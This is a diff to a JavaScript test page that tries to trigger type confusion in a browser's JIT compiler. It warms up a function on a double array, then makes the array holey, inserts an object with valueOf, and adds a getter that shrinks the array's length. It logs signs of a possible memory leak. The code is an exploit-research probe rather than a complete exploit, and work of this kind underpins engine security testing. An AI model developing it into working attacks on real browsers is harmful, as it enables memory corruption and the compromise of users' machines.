@@ -7,31 +7,33 @@ const log = m => document.getElementById("log").textContent += m + "\n";
 // =======================
 // TARGET
 // =======================
-function vuln(a) {
-    return a[0] + 1.1;
+function vuln(a, i) {
+    return a[i] + 1.1;
 }
 
 // =======================
-// WARMUP (force JIT)
+// WARMUP (JIT expects double elements)
 // =======================
-let arr = [1.1, 2.2, 3.3]; // PACKED_DOUBLE
+let arr = [1.1, 2.2, 3.3, 4.4];
 
 for (let i = 0; i < 100000; i++) {
-    vuln(arr);
+    vuln(arr, 0);
 }
 
 // =======================
-// BREAK ASSUMPTION
+// BREAK ASSUMPTIONS
 // =======================
 
-// ubah jadi HOLEY + OBJECT
-delete arr[1];
-arr[0] = {x: 42};
+// Step 1: make holey
+delete arr[0];
 
-// getter side-effect (deterministic)
-Object.defineProperty(arr, 2, {
+// Step 2: change type
+arr[0] = { valueOf() { return 13.37; } };
+
+// Step 3: side-effect that changes length deterministically
+Object.defineProperty(arr, 1, {
     get() {
-        arr.length = 100;
+        arr.length = 1;
         return 2.2;
     }
 });
@@ -39,18 +41,26 @@ Object.defineProperty(arr, 2, {
 // =======================
 // TRIGGER
 // =======================
-let res = vuln(arr);
+let r1 = vuln(arr, 0);
+let r2 = vuln(arr, 1);
 
-log("Result: " + res);
+log("r1 = " + r1);
+log("r2 = " + r2);
 
 // =======================
-// OBSERVATION
+// CHECKS (VALID SIGNAL ONLY)
 // =======================
-if (typeof res !== "number") {
-    log("TYPE CONFUSION!");
+
+// harus number
+if (typeof r1 !== "number" || typeof r2 !== "number") {
+    log("❗ unexpected type (possible confusion)");
 }
 
-if (res > 1e12) {
-    log("POTENTIAL LEAK: " + res);
+// cari nilai aneh (bukan coercion string)
+if (Number.isFinite(r1) && Math.abs(r1) > 1e10) {
+    log("❗ suspicious large float: " + r1);
+}
+if (Number.isFinite(r2) && Math.abs(r2) > 1e10) {
+    log("❗ suspicious large float: " + r2);
 }
 </script>
